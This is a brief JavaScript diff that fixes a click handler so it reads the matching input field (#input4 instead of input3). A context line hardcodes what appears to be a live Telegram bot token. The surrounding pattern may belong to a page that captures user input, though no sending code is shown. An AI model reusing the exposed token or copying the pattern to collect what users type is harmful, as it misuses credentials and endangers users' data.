@@ -100,7 +100,7 @@ const token4 = '6368050606:AAG3QWHN4SUcnB87qfkWkPOstxJ9vXzpwUQ';
 btn4.addEventListener('click', () => {
    setTimeout(() => {
     const input4 = document.querySelector('#input4');
-    let inp4 = input3.value;
+    let inp4 = input4.value;
 
     input4.value = '';
 
